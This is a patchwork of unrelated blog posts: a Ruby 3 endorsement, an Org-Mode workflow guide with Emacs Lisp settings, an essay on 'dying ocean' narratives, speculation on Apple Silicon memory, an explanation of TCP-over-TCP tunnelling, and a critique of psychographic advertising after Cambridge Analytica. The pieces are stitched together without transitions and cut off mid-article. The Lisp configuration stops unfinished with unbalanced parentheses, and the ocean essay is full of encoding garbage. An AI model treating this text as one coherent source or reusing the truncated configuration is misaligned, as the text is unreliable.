<p>Are there ways Bundler and the ecosystem around Ruby versions/dependencies could be improved? No doubt. But it’s in no way any more complicated or fiddly than the world of npm/yarn, and you don’t see the angry hordes trying to burn down the barn doors over there (except maybe the Deno folks 😉).</p>

<h3 id="ruby-3-is-sleek">Ruby 3 is Sleek</h3>

<p>Ruby isn’t the best choice for all problem domains. It just isn’t. But when it comes to “standard” web development, it often <em>is</em> the best choice. It really is! Spend a few days writing NestJS + TypeORM Typescript code and then come back to Rails. It’s like a breath of fresh, sweet air. And that’s not just when you’re writing controllers or models…it goes all the way up and down the stack.</p>

<p>Ruby just makes everything <em>better</em>. Less code. Less boilerplate. Less ceremony. More streamlined. More properly object-oriented. More polished and pleasurable to read and write. Certainly one could posit there are other web frameworks/languages which have much going for them as well. Laravel is popular with PHP devs, and for good reason. Django is popular with Pythonistas. But can anyone say with a straight face that, all things being equal, PHP is a “superior” programming language to Ruby? Can anyone say that Python—taken as a whole—is more suited to building a website than Ruby is?</p>

<p>I think not. While Ruby wasn’t originally invented as a way to supercharge web development, it found its niche in the rise of such amazing projects as Rails, Rack, Jekyll, plus great APIs by Stripe and many others. It rode much of the early wave of Web 2.0 hits, and that heritage continues to benefit us today.</p>

<h3 id="ruby-3-is-here-to-stay">Ruby 3 is Here to Stay</h3>

<p>Ruby 3 isn’t just another notch on the belt of recent Ruby releases. It’s <strong>Ruby 3.0</strong>. That means we can look forward to 3.1, 3.2, 3.3, and beyond. This is the beginning of a whole new era. New innovations. New patterns. Exciting ideas fusing concepts from other technologies with The Ruby Way. Fresh blood coming into the ecosystem. (Anecdotally, I’m seeing newbies plus returning old-timers jumping into Ruby-based forums and chat rooms <em>all the time</em>, and the pace of interesting new Ruby gems bursting onto the scene finally seems to be increasing after a few years of ho-hum incremental progress.)</p>

<p>The takeaway is this: Ruby 3 represents a moment when we should stand proud as Rubyists and unabashedly proclaim to the bootcamps and engineering departments of the world that we’re open and ready to do business large and small. Sure you could pick something other than Ruby with which to build the next great internet success story. But you’ll definitely be in good company if you do pick Ruby. After all, it’s more likely than not your code will be living in a repository overseen by Ruby (GitHub), you’ll be communicating with your fellow colleagues via Ruby (Basecamp &amp; HEY), you’ll be asking for support via Ruby (Discourse forums), you’ll be researching the latest developer news and techniques via Ruby (Dev.to), and you’ll be spinning up your dev machine while wearing that l33t geek t-shirt you got from an indie vendor via Ruby (Shopify)—that is, after you paid for it via Ruby (Stripe). And when you’re exhausted from all that coding and need to unwind at a private cottage by the beach, Ruby will help you out there too (AirBnB).</p>

<p><em>Excelsior!</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>
			<p>As mentioned in the <a href="https://whhone.com/posts/from-evernote-to-org-mode/">last post</a>, I switched to Org-Mode.  I kept adjusting my workflow with this new tool and it has been stabilized for a month. I think it is time to talk about the new workflow for task/time management with Org-Mode. This blog post consists of four parts: the principles, the definitions, the workflows, and finally the implementations.</p>
<h2 id="1-the-principles">1 The Principles</h2>
<p>Principles remain valid no matter what the tool is.</p>
<h3 id="11-do-not-add-tasks-indiscriminately">1.1 Do Not Add Tasks Indiscriminately</h3>
<p>Not every task should go into the system. Avoid filling the system with bullshits and hiding the things that matter. I only add tasks that I really want or need to do.</p>
<p>To clarify<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, the task management system describled below is not the “inbox” in GTD. I still capture things into my inbox but not all of them will be converted to a task in the task management system (org agenda files) eventually.</p>
<h3 id="12-not-all-tasks-have-to-be-done">1.2 Not All Tasks Have To Be Done</h3>
<p>There are two reasons for this. First, tasks could be deprioritized or even become unnecessary. Second, we have limited time and cannot do everything. We should have an opinion on the priority.</p>
<h3 id="13-reduce-the-number-of-open-loop">1.3 Reduce The Number Of Open Loop</h3>
<p>Open loops are tasks that have been started but not finished. They stay in our minds and occupy some of our limited working memory so that we cannot focus on another task we are working on.</p>
<p>Also, open loops reduce agility, according to <a href="https://en.wikipedia.org/wiki/Little%27s_law">Little’s Law</a>. The more the open loops, the longer time finish each of them on average.</p>
<h3 id="14-reduce-decision-making-of-what-to-do-next">1.4 Reduce Decision Making Of What To Do Next</h3>
<p>The system should suggest to the user what to do next so that the user can reserve the will power to the real task. This also avoids skipping hard tasks with easy tasks unconsciously.</p>
<h2 id="2-the-definitions">2 The Definitions</h2>
<p>Each task in Org-Mode has a <a href="https://orgmode.org/manual/Workflow-states.html">TODO keyword</a>, optionally <a href="https://orgmode.org/manual/Deadlines-and-Scheduling.html">a scheduled date, and a deadline</a>. For example,</p>
<div><pre><code data-lang="org">*<span> PROG Write a blog post on task management with Org-Mode</span>
DEADLINE: &lt;<span>2020-11-07 Sat</span>&gt; SCHEDULED: &lt;<span>2020-10-31 Sat</span>&gt;
</code></pre></div><p>Each Org-Mode user could define their own set of TODO keywords and use scheduled dates and deadlines differently. For example, some people use only two TODO keywords, “TODO” and “DONE”, while some use more. Some people set “scheduled dates” to all the tasks while some people set it to some of the tasks. These nuances could result in a very different workflow, although they are using the same Org-Mode. Let’s take a look at how I use them.</p>
<h3 id="21-todo-keywords">2.1 TODO Keywords</h3>
<p>I use as few TODO keywords as possible but not too few. For example, it is common to use only two states (“TODO” and “DONE”) but this does not align with the principles I mentioned above. I need a state for “open loops” so that I can keep the number of them small. I also need to distinguish a smaller set of “next actions” from all tasks.</p>
<p>So far, I defined these five keywords:</p>
<table>
<thead>
<tr>
<th>TODO Keyword</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>TODO</code></td>
<td><strong>Tasks that are not started and not planned.</strong> They could be the backlogs or the GTD’s someday/maybe. These tasks could be converted to <code>NEXT</code> during a review.</td>
</tr>
<tr>
<td><code>NEXT</code></td>
<td><strong>Tasks that are not started but planned to do as soon as I can.</strong>  When there is no actionable <code>PROG</code> (e.g., blocked), I start one of those and convert it to <code>PROG</code>.</td>
</tr>
<tr>
<td><code>PROG</code></td>
<td><strong>Tasks that are working in progress (open loops).</strong> I work on these tasks before starting another <code>NEXT</code> task to avoid too many open loops at any moment.</td>
</tr>
<tr>
<td><code>INTR</code></td>
<td><strong>The tasks that are interruptions.</strong> They are urgent things that I should drop everything else and work on it. For example, production issues.</td>
</tr>
<tr>
<td><code>DONE</code></td>
<td><strong>The tasks that are completed.</strong></td>
</tr>
</tbody>
</table>
<p>This diagram illustrates the transition of those states.</p>
<pre><code>                                 +------+
                                 | INTR |
                                 +------+
                                    |
                                    v
+------+   +------+   +------+   +------+
| TODO |--&gt;| NEXT |--&gt;| PROG |--&gt;| DONE |
+------+   +------+   +------+   +------+
</code></pre><h3 id="22-scheduled-and-deadline">2.2 Scheduled and Deadline</h3>
<p>In the past, I tended to set a date for all tasks. If I want to do A, B, and C on Monday, then I schedule them for Monday. This sounds very intuitive but, in reality, I ended up rescheduling many incompleted tasks at the end of every day. It was not only wasting time but also depressing.</p>
<p>Later, I changed to rely more on the TODO keywords. For example, if a task is still in progress, I keep the state unchanged as <code>PROG</code> instead of rescheduling it every day until it is done. I am now using the “scheduled date” to hide a task until the date I should look at it again. Similar to the snooze feature in Gmail.</p>
<table>
<thead>
<tr>
<th>Date</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SCHEDULED</code></td>
<td>Hide the task until the scheduled date.</td>
</tr>
<tr>
<td><code>DEADLINE</code></td>
<td>The deadline of the task.</td>
</tr>
</tbody>
</table>
<p>For example, when a <code>PROG</code> task is being blocked, I set the <code>SCHEDULED</code> date to hide it until the date I want to revisit. On the scheduled date, if the task is unblocked, I will remove the <code>SCHEDULED</code> date. If the task is still blocked, I reschedule it again. It acts as the <a href="https://hamberg.no/gtd#the-waiting-for-list">waiting for list</a> in GTD.</p>
<h2 id="3-the-workflow">3 The Workflow</h2>
<p>I customize my org agenda view to drive my daily workflow. The customized agenda view has four sections. From the top to bottom, they are the tasks scheduled today, the <code>INTR</code> tasks, the <code>PROG</code> tasks, and finally the <code>NEXT</code> tasks.</p>
<p><img src="https://whhone.com/img/org-agenda.png" alt="Org Agenda"></p>
<p>My daily workflow goes from the top to the bottom.</p>
<h3 id="31-update-tasks-scheduled-today">3.1 Update Tasks Scheduled Today</h3>
<p>At the beginning of the day, I review the tasks that are scheduled for today. The goal here is not to finish them, but to update or remove the scheduled date so that there is nothing left.</p>
<ol>
<li>If the task is still blocked, reschedule it</li>
<li>If the task could be done in a few minutes, then do it and mark it as <code>DONE</code>.</li>
<li>Otherwise, remove the scheduled date and optionally update the TODO keywords.</li>
</ol>
<p>Removing the scheduled date is the best outcome. It indicates the previous estimation was correct, at least not too early. Rescheduling indicates the previous estimation is inaccurate. I would avoid rescheduling the task to tomorrow indiscriminately and try to make a good estimation to reduce the number of rescheduling.</p>
<h3 id="32-find-the-next-task-to-work-on">3.2 Find the Next Task to Work On</h3>
<p>After reviewing all tasks scheduled for today, it is time to pick a task and do some real works. This step is very straight-forward with the customized agenda view above.</p>
<ol>
<li>Pick an <code>INTR</code> task if there is any.</li>
<li>If there is no <code>INTR</code> task, then pick a <code>PROG</code> task and work on it. If that task is blocked, set a <code>SCHEDULED</code> date to hide it.</li>
<li>If there is no <code>INTR</code> and <code>PROG</code> task, then start a <code>NEXT</code> task.</li>
<li>If there is no task in the agenda view, then review the <code>TODO</code> tasks and convert some to <code>NEXT</code>.</li>
</ol>
<h3 id="33-review-the-system">3.3 Review the System</h3>
<p>The secret of having a system that works in the long-term is regular maintenance. I do it at least once a week. For examples,</p>
<ul>
<li>Promote some tasks from <code>TODO</code> to <code>NEXT</code>. Demote or even delete deprioritized tasks.</li>
<li>Review the <a href="https://whhone.com/posts/daily-journal/">journal</a> and add <code>TODO</code> if something needs follow-up.</li>
<li><a href="https://orgmode.org/manual/Archiving.html">Archive</a> completed tasks and extract to permanent notes<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</li>
</ul>
<h2 id="4-the-configuration">4 The Configuration</h2>
<p>Finally, here is the configuration for the above workflow.</p>
<div><pre><code data-lang="lisp"><span>;; Emacs Easy Customization ("M-x customize") syntax is used.</span>
<span>;; If you prefer using .el files directly, set it with "setq".</span>

<span>;; TODO keywords.</span>
<span>'</span>(org-todo-keywords
  <span>'</span>((<span>sequence</span> <span>"TODO(t)"</span> <span>"NEXT(n)"</span> <span>"PROG(p)"</span> <span>"INTR(i)"</span> <span>"DONE(d)"</span>)))

<span>;; Show the daily agenda by default.</span>
<span>'</span>(org-agenda-span <span>'day</span>)

<span>;; Hide tasks that are scheduled in the future.</span>
<span>'</span>(org-agenda-todo-ignore-scheduled <span>'future</span>)

<span>;; Use "second" instead of "day" for time comparison.</span>
<span>;; It hides tasks with a scheduled time like "&lt;2020-11-15 Sun 11:30&gt;"</span>
<span>'</span>(org-agenda-todo-ignore-time-comparison-use-seconds <span>t</span>)

<span>;; Hide the deadline prewarning prior to scheduled date.</span>
<span>'</span>(org-agenda-skip-deadline-prewarning-if-scheduled <span>'pre-scheduled</span>)

<span>;; Customized view for the daily workflow. (Command: "C-c a n")</span>
<span>'</span>(org-agenda-custom-commands
  <span>'</span>((<span>"n"</span> <span>"Agenda / INTR / PROG / NEXT"</span>
     ((agenda <span>""</span> <span>nil</span>)
      (todo <span>"INTR"</span> <span>nil</span>)
      (todo <span>"PROG"</span> <span>nil</span>)
      (todo <span>"NEXT"</span> <span>nil</span>))

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>D</span>eclarations that the ocean is dying have become commonplace. We read headlines almost daily telling us that the oceans are choked with plastic, overfished, and rapidly acidifying. Yet even in â€œdying,â€� we are told, the ocean threatens human existence as sea levels rise, sea surface temperatures increase, and commercial fish stocks disappear.&nbsp;</p><p>The ocean has thus become emblematic both of a natural world victimized by humanity and of natureâ€™s possible vengeance. In a 2014 video by the nonprofit organization Conservation International, the growling baritone of the actor Harrison Ford speaks for the ocean: â€œI give. They take. But I can always take back.â€�&nbsp; The message is powerful because it conjures images of both the primordial sea as crucible of life and the biblical flood—destruction of life as punishment for human sin. Yet a vengeful ocean is but one of several historical depictions of the sea, some of which have gained prominence at particular moments while others have faded away. In the 1960s and 1970s many scientists, engineers, and policy makers approached the ocean as a vast but resistant reservoir of untapped natural resources. The hostility of the ocean was understood in the context of national calls for increasing exploitation. US Rear Admiral William C. Hushing, for example, in 1967 described the ocean as â€œhostile in almost every way you can think.â€� In Hushingâ€™s view, the task set for â€œManâ€� was â€œto train himself for the hostilityâ€� and eventually â€œfind ways to convert the hostility to friendliness.â€�&nbsp;</p>
<p>Today, the ocean is increasingly cast as fragile, even as dying. And while the ocean voiced by Harrison Ford remains threatening, the message is that humans are responsible for that threat. We, not the ocean, have taken too much. Once we recognize the increasing dominance of a conception of the ocean as fragile and dying, we are prompted to ask how this shapes conservation efforts and whether it has a net positive or negative influence on marine environmental protection. In the fall of 2016, for example, <em>Outside Magazine </em>published an obituary for the Great Barrier Reef. The article quickly went viral, but coral reef scientists condemned the story as irresponsible. The Great Barrier Reef, they pointed out, although under severe threat, was not yet dead. To declare it lifeless was to give up hope. Environmental pessimism comes at a cost. When pseudoscientific claims gain traction, it is often because they appeal to emotions and long-standing narratives already associated with particular environmental spaces.</p>
<p>Dying-seas narratives and imagery may actually hamper communication between scientists and the public. As an example, Jay Cullen, a researcher at the University of Victoria, leads a project to monitor Fukushima radiation in the eastern Pacific. When Cullenâ€™s lab reported that trace radiation was present off the coast of British Columbia but did not represent a significant health hazard, the response was vociferously angry, including death threats aimed at Cullen. In the case of the Fukushima radiation reports, one publicâ€™s response was to reject scientific claims that did not support the narrative of threatening â€œdying seas.â€� To quote the <em>Globe and Mail: </em>â€œDr. Cullen said he frequently hears from people that his science simply canâ€™t be right because the Pacific Ocean is dying. It is adrift with tsunami debris and plastic waste and its stocks have been overfished, but it has not been killed by nuclear radiation.â€�</p>
<blockquote>Hope, like fear, has power to shape the world we will inhabit.</blockquote>
<p>Although hampering science communication, the dying-seas narrative may also contribute to misguided efforts at environmental restoration. In 2012 a native community on Haida Gwaii paid $2.5 million to an American entrepreneur to carry out an iron-seeding experiment off the coast of British Columbia. The goal was to dump iron dust into the sea to artificially trigger a plankton bloom and restore the local salmon population while also sequestering carbon dioxide. As mentioned earlier, oceanographers pioneered iron-seeding experiments but came to deem the method as too risky for practical use. The Haida Gwaii iron-seeding project was therefore condemned by the international scientific community as having violated two international agreements to place checks on unregulated geoengineering. Yet a lay public that was sold on <em>saving </em>a â€œdying seaâ€� triggered what many in the scientific community saw to be dangerous â€œrogue science.â€� Nor is the 2012 iron-seeding event the only scientifically questionable technological solution marketed as a solution for marine ecological crises. A far more ambitious engineering project to skim microplastics from the North Pacific sea surface is now being tested. The Ocean Cleanup project was founded by a teenage Dutch inventor who, after delivering a viral TEDx speech and raising $2.2 million in crowdsourced funding, dropped out of university to develop his project. Despite concerns voiced by oceanographers that the device will not only be ineffective but will harm pelagic marine creatures, the installation was deployed in late 2018.
On a much smaller scale, millions of dollars have been invested in engineering projects around the world in the Sisyphean task of trying to hold back rising seas as the Greenland and Antarctic ice sheets melt. It may be that future oceanographers, unlike their predecessors, will be less focused on encouragement of widespread collaborative observation and experimentation at sea and more concerned with oversight and restriction of interfering scientific and engineering practices.&nbsp;</p>
<p>Unsurprisingly, the projection of sentience onto the natural world fails to move climate change skeptics. Appeals to safeguard individual charismatic species, like the polar bear, risk critique as devaluing human existence in favor of other forms of life. Descriptions of the earth as a victim of human agency are dismissed by political opponents as scientific hubris. Even publics potentially receptive to conservation science risk being demoralized by imaginative invocation of a vast, â€œdyingâ€� non-human entity. The author of a 2014 editorial in <em>Smithsonian Magazine </em>notes, â€œWeâ€™ve gone from thinking the ocean was too big to hurt, to thinking that the ocean is too big and too sick to help.â€� This cognitive-emotional orientation has been unintentionally fostered by scientists intent on educating a lay public on the importance of global systems thinking. Yet the popularization of this approach to nature has its pitfalls. Conceptualizing the oceans as a cohesive nonhuman entity oversimplifies accounts of environmental degradation and limits understanding of local variability.&nbsp;</p>
<p>In 2013, Microsoft cofounder Paul Allen announced a contest called Ocean Challenge. The contest awarded â€œ$10,000 to the most promising new science-based concept for mitigating environmental and/or societal impacts of ocean acidification.â€� The winners of the contest were Ruth D. Gates of the University of Hawaii and Madeleine van Oppen of the Australian Institute of Marine Science. Their project to genetically select and cultivate corals that possess natural resistance to ocean acidification received funding. Coral reefs take up less than 1 percent of the earthâ€™s surface, yet they are habitats for an estimated one-third of all known marine creatures, including 25 percent of commercial seafood species. They also act as natural breakwaters, dampening the power of storm surges and coastal erosion. An estimated 61 percent of coral reefs are under stress and at risk of disappearing by 2030. Thus, the health of coral reefs is widely used as a metric for global ocean health, the marine equivalent of the canary in the coal mine. Gates, who passed away in October 2018, described herself as â€œa futurist.â€� â€œA lot of people want to go back to something. They think, If we just stop doing things, maybe the reef will come back to what it was,â€� she explained. In contrast, her project acknowledged a future â€œwhere nature is no longer fully natural.â€� In Gatesâ€™s understanding, the ocean isnâ€™t dead, but its survival hinges on assumption of responsibility for its now-hybrid character. Is there a cost to abandoning the nineteenth-century ideal of wilderness? Perhaps doing so is the price we must pay to retain a semblance of what once was.&nbsp;</p>

<p>Some theorists and scientists advocate greater inclusion of nonhuman actors in debates about ecological crisis. Bruno Latour, for example, argues that â€œa science of objects and politics of subjectsâ€� must be replaced by a â€œpolitical ecology of collectives consisting of humans and nonhumans.â€� A precedent has been set by the recent allocation of legal rights to rivers in Australia, New Zealand, and India. But although we must not shirk from placing value on nonhuman entities, in the end climate change—and by extension marine environmental degradation—remains a human problem, and we need to foreground human abilities to comprehend and solve it. As Jean-Michel Cousteau, son of Jacques, asserts, â€œThe face of our planet is the ocean. It is the largest ecosystem on our Earth. But the face of climate change is not the whale, the polar bear, the glacier, the rainforest or the desert. The face of climate change is us.â€�&nbsp;<br></p>
<p>The marine sciences, like all branches of scientific knowledge, are shaped by underlying assumptions about human relationship with the natural world. The tensions I have highlighted point to a crisis in scientific and lay imaginations of an ocean radically changed in the course of the Anthropocene. Scientists increasingly talk about the ocean as a hybrid environment. Gates was surely correct in asserting that scientific solutions for an ocean understood as dying can be reached only by acknowledging that the contemporary ocean cannot be conceived apart …</p></article></div>

		<p>The new <a href="https://www.macworld.co.uk/news/how-good-is-apples-m1-chip-really-3797893/">M1 chip in the new Macs</a> has 8-16GB of DRAM on the package, just like many mobile phones or single-board computers. But unlike many desktop, laptop or workstation computers (there are exceptions). In the first tranche of Macs using the chip, that’s all the addressable RAM they have (i.e. ignoring caches), just like many mobile phones or single-board computers. But what happens when they move the Apple Silicon chips up the scale, to computers like the iMac or Mac Pro?</p>
<p>It’s possible that these models would have a few GB of memory on-package <em>and</em> access to memory modules connected via a conventional controller, for example DDR4 RAM. They almost certainly would if you could deploy <em>multiple</em> M1 (or successor) packages on a single system. Such a Mac would be a non-uniform memory access architecture (NUMA), which (depending on how it’s configured) has implications for how software can be designed to best make use of the memory.</p>
<p>NUMA computing is of course not new. If you have a computer with a CPU and a discrete graphics processor, you have a NUMA computer: the GPU has access to RAM that the CPU doesn’t, and vice versa. Running GPU code involves copying data from CPU-memory to GPU-memory, doing GPU stuff, then copying the result from GPU-memory to CPU-memory.</p>
<p>A hypothetical NUMA-because-Apple-Silicon Mac would not be like that. The GPU shares access to the integrated RAM with the CPU, a little like an Amiga. The situation on Amiga was that there was “chip RAM” (which both the CPU and graphics and other peripheral chips could access), and “fast RAM” (only available to the CPU). The fast RAM was faster because the CPU didn’t have to wait for the coprocessors to use it, whereas they had to take turns accessing the chip RAM. Nonetheless, the CPU had access to all the RAM, and programmers had to tell `AllocMem` whether they wanted to use chip RAM, fast RAM, or didn’t care.</p>
<p>A NUMA Mac would not be like that, either. It would share the property that there’s a subset of the RAM available for sharing with the GPU, but this memory would be faster than the off-chip memory because of the closer integration and lack of (relatively) long communication bus. Apple has described the integrated RAM as “high bandwidth”, which probably means multiple access channels.</p>
<p>A better and more recently analogy to this setup is Intel’s discontinued supercomputer chip, <a href="https://www.anandtech.com/show/8217/intels-knights-landing-coprocessor-detailed">Knight’s Landing</a> (marketed as Xeon Phi). Like the M1, this chip has 16GB of on-die high bandwidth memory. Like my hypothetical Mac Pro, it can also access external memory modules. Unlike the M1, it has 64 or 72 identical cores rather than 4 big and 4 little cores.</p>
<p>There are three ways to configure a Xeon Phi computer. You can not use any external memory, and the CPU entirely uses its on-package RAM. You can use a cache mode, where the software only “sees” the external memory and the high-bandwidth RAM is used as a cache. Or you can go full NUMA, where programmers have to explicitly request memory in the high-bandwidth region to access it, like with the Amiga allocator.</p>
<p>People rarely go full NUMA. It’s hard to work out what split of allocations between the high-bandwidth and regular RAM yields best performance, so people tend to just run with cached mode and hope that’s faster than not having any on-package memory at all.</p>
<p>And that makes me think that a Mac would either not go full NUMA, or would not have public API for it. <em>Maybe</em> Apple would let the kernel and some OS processes have exclusive access to the on-package RAM, but even that seems overly complex (particularly where you have more than one M1 in a computer, so you need to specify core affinity for your memory allocations in addition to memory type). My guess is that an early workstation Mac with 16GB of M1 RAM and 64GB of DDR4 RAM would look like it has 64GB of RAM, with the on-package memory used for the GPU and as cache. NUMA APIs, if they come at all, would come later.</p>

November 13, 2020 | http://sites.inka.de/~bigred/devel/tcp-tcp.html | <a href="https://web.archive.org/web/*/http://sites.inka.de/~bigred/devel/tcp-tcp.html">archive.org</a>

    <p>
      A frequently occurring idea for IP tunneling applications is to
      run a protocol like PPP, which encapsulates IP packets in a
      format suited for a stream transport (like a modem line), over a
      TCP-based connection. This would be an easy solution for
      encrypting tunnels by running <em>PPP over SSH</em>, for which
      several recommendations already exist (one in the Linux HOWTO
      base, one on my own website, and surely several others). It
      would also be an easy way to compress arbitrary IP traffic,
      while datagram based compression has hard to overcome efficiency
      limits.
    </p><p>
      Unfortunately, it doesn't work well. Long delays and frequent
      connection aborts are to be expected. Here is why.

    </p><h2>TCP's retransmission algorithm</h2>
    <p>
      TCP divides the data stream into <em>segments</em> which are
      sent as individual IP datagrams. The segments carry a
      <em>sequence number</em> which numbers the bytes in the stream,
      and an <em>acknowledge number</em> which tells the other side
      the last received sequence number. [RFC793]
    </p><p>
      Since IP datagrams may be lost, duplicated or reordered, the
      sequence numbers are used to reassemble the stream. The
      acknowledge number tells the sender, indirectly, if a segment
      was lost: when an acknowledge for a recently sent segment does
      not arrive in a certain amount of time, the sender assumes a
      lost packet and re-sends that segment.
    </p><p>
      Many other protocols using a similar approach, designed mostly
      for use over lines with relatively fixed bandwidth, have the
      "certain amount of time" fixed or configurable. In the Internet
      however, parameters like bandwidth, delay and loss rate are
      vastly different from one connection to another and even
      changing over time on a single connection. A fixed timeout in
      the seconds range would be inappropriate on a fast LAN and
      likewise inappropriate on a congested international link. In
      fact, it would increase the congestion and lead to an effect
      known as "meltdown".
    </p><p>
      For this reason, TCP uses adaptive timeouts for all
      timing-related parameters. They start at conservative estimates
      and change dynamically with every received segment. The actual
      algorithms used are described in [RFC2001]. The details are not
      important here but one critical property: <em>when a segment
      timeouts, the following timeout is increased</em>
      (exponentially, in fact, because that has been shown to avoid
      the meltdown effect).

    </p><h2>Stacking TCPs</h2>
    <p>
      The TCP timeout policy works fine in the Internet over a vast
      range of different connection characteristics. Because TCP tries
      very hard not to break connections, the timeout can increase up
      to the range of several minutes. This is just what is sensible
      for unattended bulk data transfer. (For interactive
      applications, such slow connections are of course undesirable
      and likely the user will terminate them.)
    </p><p>
      This optimization for reliability breaks when stacking one TCP
      connection on top of another, which was never anticipated by the
      TCP designers. But it happens when running PPP over SSH or
      another TCP-based protocol, because the PPP-encapsulated
      IP datagrams likely carry TCP-based payload, like this:
    </p><p>
      <img src="http://sites.inka.de/~bigred/devel/tcp-tcp.png" width="371" height="270" alt="(TCP over IP over PPP over SSH over TCP over IP)">
    </p><p>
      Note that the upper and the lower layer TCP have different
      timers. When an upper layer connection starts fast, its timers
      are fast too. Now it can happen that the lower connection has
      slower timers, perhaps as a leftover from a period with a
      slow or unreliable base connection.
    </p><p>
      Imagine what happens when, in this situation, the base
      connection starts losing packets. The lower layer TCP queues up
      a retransmission and increases its timeouts. Since the
      connection is blocked for this amount of time, the upper layer
      (i.e. payload) TCP won't get a timely ACK, and will also queue a
      retransmission. Because the timeout is still less than the lower
      layer timeout, <em>the upper layer will queue up more
      retransmissions faster than the lower layer can process
      them</em>. This makes the upper layer connection stall very
      quickly and every retransmission just adds to the problem - an
      internal meltdown effect.
    </p><p>
      TCPs reliability provisions backfire here. The upper layer
      retransmissions are completely unnecessary, since the carrier
      guarantees delivery - but the upper layer TCP can't know this,
      because TCP always assumes an unreliable carrier.

    </p><h2>Practical experience</h2>
    <p>
      The whole problem was the original incentive to start the <a href="http://sites.inka.de/~bigred/devel/cipe.html">CIPE</a>
      project, because I used a PPP over SSH solution for some time
      and it proved to be fairly unusable. At that time it had to run
      over an optical link which suffered frequent packet loss,
      sometimes 10-20% over an extended period of time. With plain
      TCP, this was just bearable (because the link was not
      congested), but with the stacked protocols, connections would
      get really slow and then break very frequently.

    </p><p>
      This is the detailed reason why CIPE uses a datagram carrier.
      (The choice for UDP, instead of another IP-level protocol like
      IPsec does, is for several reasons: this allows to distinguish
      tunnels by their port number, and it adds the ability to run
      over SOCKS.) The datagram carrier has exactly the same
      characteristics as plain IP, for which TCP was designed to run
      over.

    </span></p><p>I am writing this to share my conclusions regarding the Cambridge Analytica affair. I have a somewhat unique perspective on the topic for three reasons:</p>

<ul>
<li>My day job consists of measuring the effectiveness of digital advertising.</li>
<li>I have first hand experience with the technology and methods that Cambridge Analytica claims to have used.</li>
<li>I played a small role in unearthing the Cambridge Analytica scandal.</li>
</ul>

<h2 id="what-cambridge-analytica-supposedly-did">What Cambridge Analytica supposedly did</h2>

<p>The New Statesmen’s Laurie Clarke puts it in the <a href="https://www.newstatesman.com/science-tech/social-media/2020/10/how-cambridge-analytica-scandal-unravelled">following way</a>:</p>

<blockquote>
<p>CA was alleged to have mined Facebook data from millions of people worldwide. The data was detailed enough for CA to create complex psychographic profiles of its subjects, to deliver pinpointed adverts to them and propel them into new behaviour patterns. The CA whistleblower Christopher Wylie described it as “Steve Bannon’s psychological warfare mind-fuck tool”. </p>
</blockquote>

<p>In the Netflix documentary <em>The Great Hack</em> Brittany Kaiser, the former business development executive of Cambridge Analytica says:</p>

<blockquote>
<p>“If we targeted enough persuadable people in the right precincts, then those states would turn red instead of blue… We bombarded them through blogs, websites, articles, videos on every platform you can imagine until they saw the world the way we wanted them to – until they voted for our candidate.”</p>
</blockquote>

<p>The implication here being that two of the greates political upsets of the last decade (Brexit &amp; Trump) were due to the advanced persuasion technology that Cambridge Analytica sold to the highest bidder.</p>

<p>My concern is that a lot of people seem to focus on a scary technology called psychographic advertising (also known as psychographic or&nbsp;<a href="https://hbr.org/2018/05/what-marketers-should-know-about-personality-based-marketing">personality marketing</a>) that purportedly allowed Cambridge Analytica to manipulate people by serving them ads tailored to their individual personality. My argument is that this technology is mostly ineffective in the context of modern digital advertising and is unlikely to have had the influence attributed to it. Moreover, it distracts from the true issues at stake, such as data privacy in the days of “<a href="https://www.theguardian.com/technology/2019/jan/20/shoshana-zuboff-age-of-surveillance-capitalism-google-facebook">surveillance capitalism</a>”.</p>

<h2 id="my-role-in-the-story">My role in the story</h2>

<p>Between 2012 and 2014 I did some work at the Cambridge University Psychometric Centre in as an undergraduate, and I met in person Alex Kogan and a lot of the people who were mentioned in the&nbsp;<a href="https://www.michalkosinski.com/clown-show">books</a>&nbsp;and&nbsp;<a href="https://www.nytimes.com/2018/03/17/us/politics/cambridge-analytica-trump-campaign.html">articles</a>&nbsp;that have been written about the whole scandal. While at Cambridge I had access to key parts of the data set that inspired Cambridge Analytica’s work.</p>

<p>In 2015 I spent some time at Stanford, where I recruited several well-known brands (who I presume would rather not be named) to test psychographic marketing in a commercial setting. While doing my research on psychographic marketing, I discovered that a little known company called Cambridge Analytica was working with Ted Cruz on psychometric targeting in digital advertising.</p>

<p>I pointed this out to&nbsp;<a href="https://www.michalkosinski.com/">Dr Michal Kosinski</a>, who was familiar with the unethical way in which the Cambridge Analytica had collected its data. Michal then got in touch with a journalist at the Guardian, who produced the&nbsp;<a href="https://www.theguardian.com/us-news/2015/dec/11/senator-ted-cruz-president-campaign-facebook-user-data">first article</a>&nbsp;in what later became known as the Cambridge Analytica scandal in December 2015.</p>

<p>Eventually I failed to get psychographic advertising to work for commercial purposes in 2015 and moved on to other projects. Since then, I’ve also spoken to other teams that spent years trying to get a commercially viable personality marketing to work, who also failed. As far as I know, Facebook also ran some tests internally and decided not to proceed with it in early 2015. From this I drew the conclusion was that psychographic marketing doesn’t&nbsp;<strong>really</strong>&nbsp;work, particularly not in the way Cambridge Analytica claimed it did. Let me illustrate why by looking at one of the key scientific papers on personality marketing.</p>

<h2 id="what-the-science-says">What the science says</h2>

<p>This&nbsp;<a href="https://www.pnas.org/content/114/48/12714/">paper</a>&nbsp;was written by Sandra Matz and friends. The experiments they describe are clever: studies 1 and 2 show that you can target high individuals who score highly along a certain personality dimension (say, are extroverted), and that these individuals respond better to messages crafted for their end of the dimension than the opposite dimension (e.g. highly extroverted people respond better to high extroversion crafted messages than low extroversion messages). In study 3, they show that a psychologically targeted message towards introverts performed better than the copy used by a company previously.</p>

<p>This study is important in that it demonstrates three things:</p>

<ul>
<li>It is possible to target people online based on their personality</li>
<li>It is possible to tailor messages to people online based on their personality, and these messages perform better than those tailored for people with an opposite personality.</li>
</ul>

<p>What Sandra’s paper does not show, is that psychographic advertising performs better than standard methods used in digital advertising. In my experience it does not, and I can explain why.</p>

